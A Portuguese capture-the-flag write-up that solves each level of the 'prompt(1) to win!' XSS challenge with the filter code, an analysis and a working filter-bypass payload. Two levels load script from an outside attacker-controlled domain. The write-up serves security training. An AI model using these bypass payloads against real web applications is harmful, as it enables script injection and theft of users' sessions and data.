# 🧠 Write-Up- Duckware Team- prompt(1) to win!

> Autor: @Piceli{DuckWare}
> 
> Este write-up documenta a resolução passo a passo dos **16 níveis** do desafio "prompt(1) to win!", focado em vulnerabilidades de **XSS (Cross-Site Scripting)**. O objetivo é simples: fazer com que a função `prompt(1)` seja executada no navegador **sem interação do usuário**. Cada nível aplica um filtro diferente, exigindo criatividade, conhecimento técnico e compreensão de comportamentos peculiares dos navegadores para ser superado.

---

## 🎯 Regras Gerais do Desafio

* ✅ O código `prompt(1)` deve ser executado automaticamente.
* ✅ A execução deve funcionar em pelo menos um dos navegadores: **Chrome**, **Firefox** ou **Internet Explorer 10+**.
* ✅ Cada nível aplica um filtro diferente para dificultar a injeção.
* ✅ Quanto **menor** o payload (em caracteres), **melhor**.

---

## ✅ Level 0 - Injeção Básica

### 🔍 Código:

```js
function escape(input) {
    return '<input type="text" value="' + input + '">';
}
```

### 🧠 Análise:

O input é inserido diretamente dentro de um atributo HTML `value`. Sem nenhuma sanitação, isso permite a injeção direta de código HTML.

### 💡 Estratégia:

* Fechar aspas do `value` com `"`.
* Inserir uma tag `<svg>` com evento `onload=prompt(1)`.

### ✅ Payload:

```html
"><svg/onload=prompt(1)>
```

---

## ✅ Level 1 - Remoção de Tags HTML

### 🔍 Código:

```js
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, '');
return '<article>' + input + '</article>';
```

### 🧠 Análise:

A regex remove qualquer tag HTML completa. Mas se usarmos uma tag malformada (sem `>`), ela não é removida.

### 💡 Estratégia:

* Usar uma tag incompleta, como `<svg/onload=prompt(1)` com espaço no final para que o navegador entenda como válida.

### ✅ Payload:

```html
<svg/onload=prompt(1) 
```

---

## ✅ Level 2 - Bloqueio de `=` e `(`

### 🔍 Código:

```js
input = input.replace(/[=(]/g, '');
```

### 🧠 Análise:

Remove os caracteres essenciais para executar funções, como `prompt(1)`.

### 💡 Estratégia:

* Usar entidades HTML para `(`: `&#40;`.
* O `=` pode ser evitado usando o JavaScript inline em um script SVG.

### ✅ Payload:

```html
<svg><script>prompt&#40;1)</script>
```

---

## ✅ Level 3 - Comentários HTML

### 🔍 Código:

```js
input = input.replace(/->/g, '_');
return '<!-- ' + input + ' -->';
```

### 🧠 Análise:

A entrada é colocada dentro de um comentário HTML. O fechamento padrão `-->` é bloqueado.

### 💡 Estratégia:

* Usar a sequência `--!>`, que apesar de gerar erro de parse, termina o comentário.

### ✅ Payload:

```html
--!><svg/onload=prompt(1)
```

---

## ✅ Level 4 - `decodeURIComponent` + Regex

### 🔍 Código:

```js
if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
  // cria <script src=input>
}
```

### 🧠 Análise:

Valida se a URL começa com `//prompt.ml/`, mas antes disso, a string é decodificada.

### 💡 Estratégia:

* Usar `%2f` (equivalente a `/`) e `@` para fingir que `prompt.ml` é um usuário, não o host.

### ✅ Payload:

```html
//prompt.ml%2f@14.rs
```

*(O domínio `14.rs` deve hospedar um script com `prompt(1)`)*

*(O domínio depois de `@` deve hospedar o script com `prompt(1)`)*

---

## ✅ Level 5 - Regex mal feita + eventos em linha

### 🔍 Código:

```js
input = input.replace(/>|on.+?=|focus/gi, '_');
return '<input value="' + input + '" type="text">';
```

### 🧠 Análise:

A regex tenta bloquear `>` e eventos como `onload`, mas não considera novas linhas. O HTML permite quebras de linha dentro de atributos.

### 💡 Estratégia:

* Usar atributos divididos em linhas para enganar o parser.
* Usar eventos como `onresize` (executado automaticamente em IE).

### ✅ Payload:

```html
" type=image src onerror
="prompt(1)
```

*(Funciona em IE9+)*

*(Pode ser encurtado dependendo do navegador)*

---

## ✅ Level 6 - Clobbering com atributo `name`

### 🔍 Código:

```js
var segments = input.split('#');
var formURL = segments[0];
var formData = JSON.parse(segments[1]);
```

### 🧠 Análise:

O site gera um `<form>` e insere `<input name="...">` com base nos dados JSON. Se definirmos o campo `action`, podemos sobrescrever `form.action` com um input.

### 💡 Estratégia:

* Usar `javascript:` como valor do campo `action` e clobberar o DOM.

### ✅ Payload:

```js
javascript:prompt(1)#{"action":1}
```

---

## ✅ Level 7 - Segmentos HTML em `<p>`

### 🔍 Código:

```js
input.split('#').map(t => '<p title="' + t.slice(0, 12) + '"></p>')
```

### 🧠 Análise:

Cada segmento é colocado dentro de `<p title="...">`. Precisamos contornar essa estrutura usando fechamento de tag e atributos.

### 💡 Estratégia:

* Fechar o `title`, abrir SVG, usar atributo malformado, injetar `onload`.

### ✅ Payload:

```html
"><svg a=#"onload='/*#*/prompt(1)'
```

---

## ✅ Level 8 - Separadores de linha e HTML comments em JS

### 🧠 Análise:

O filtro bloqueia quebras de linha tradicionais e barra `/`, dificultando JS. Mas `U+2028` é um separador de linha válido em JS.

### 💡 Estratégia:

* Usar `U+2028` (line separator).
* Usar `-->` como comment para ignorar parte restante.

### ✅ Payload:

```js
 prompt(1) -->
```

---

## ✅ Level 9 - `toUpperCase()` + Unicode

### 🧠 Análise:

O input é uppercased e tags são bloqueadas com `<[a-zA-Z]`, mas certos caracteres Unicode como `ſ` viram letras ASCII em upper case.

### 💡 Estratégia:

* Usar `<ſcript>` que vira `<SCRIPT>`.

### ✅ Payload:

```html
<ſcript/ſrc=//⒕₨></ſcript>
```

---

## ✅ Level 10 - Bloqueio de `prompt` + aspas

### 🧠 Análise:

Bloqueia `prompt` e `'`. Mas como os filtros são em cadeia, podemos usar `p'rompt` (que vira `prompt` após remoção de `'`).

### 💡 Estratégia:

* Inserir `p'rompt(1)`

### ✅ Payload:

```js
p'rompt(1)
```

---

## ✅ Level 11 - Injeção usando operador `in`

### 🧠 Análise:

O input vai para `"Welcome back, X"`. Mas caracteres especiais são filtrados. O operador `in` é permitido e avaliado.

### 💡 Estratégia:

* Fazer `(prompt(1))in"` que é avaliado antes de `in` e executa.

### ✅ Payload:

```js
"(prompt(1))in"
```

---

## ✅ Level 12 - `toString(radix)` e `eval`

### 🧠 Análise:

Filtra `/`, `%`, `'`, e converte tudo com `encodeURIComponent`. Mas números e `.` são permitidos.

### 💡 Estratégia:

* Codificar "prompt" como número em base 30.

### ✅ Payload:

```js
eval(630038579..toString(30))(1)
```

---

## ✅ Level 13 - `__proto__` + \`$\`\` em replace

### 🧠 Análise:

O campo `source` é filtrado, mas se for deletado, a propriedade de `__proto__` assume. Podemos usar \`$\`\` para injetar depois da string.

### 💡 Estratégia:

* Injetar com `__proto__.source` e usar \`$\`\` para aproveitar o que vem antes no replace.

### ✅ Payload:

```json
{"source":"_-_invalid-URL_-_","__proto__":{"source":"$`onerror=prompt(1)>"}}
```

*(Explora o comportamento do `replace` com padrões especiais)*

---

## ✅ Level 14 - `data:` com base64 + maiúsculas

### 🧠 Análise:

Converte tudo para maiúsculas e bloqueia `&`, `%`. Mas `data:` ainda é permitido e Firefox aceita `BASE64`.

### 💡 Estratégia:

* Codificar um payload inteiro em base64 usando letras maiúsculas válidas.

### ✅ Payload:

```html
"><IFRAME SRC="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4="
```

*(Funciona no Firefox e alguns navegadores que aceitam `BASE64` maiúsculo)*

---

## ✅ Level 15 - Segmentos com `data-comment` + SVG comments

### 🧠 Análise:

Cada segmento vai dentro de `<p title="..." data-comment='...'>`. Aspas são removidas. Precisamos esconder com `<!-- -->` dentro de SVG.

### 💡 Estratégia:

* Usar tags SVG + script + HTML comments para ignorar junk.

### ✅ Payload:

```html
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
```

---

## ⚠️ Observações Importantes

* Os níveis **4** e **14** dependem de condições específicas para funcionarem corretamente.

  * O **Level 4** requer um domínio controlado pelo atacante após o `@` que hospede um script com `prompt(1)`.
  * O **Level 14** depende de compatibilidade com a URI `data:` base64 e pode **não funcionar em alguns navegadores modernos**, sendo mais confiável no Firefox.

# ✅ Conclusão

Este desafio mostrou como a criatividade, conhecimento de especificações HTML/JS e comportamentos dos navegadores são fundamentais para explorar e contornar filtros de XSS. Mesmo os menores detalhes podem abrir brechas significativas. Um excelente treinamento !
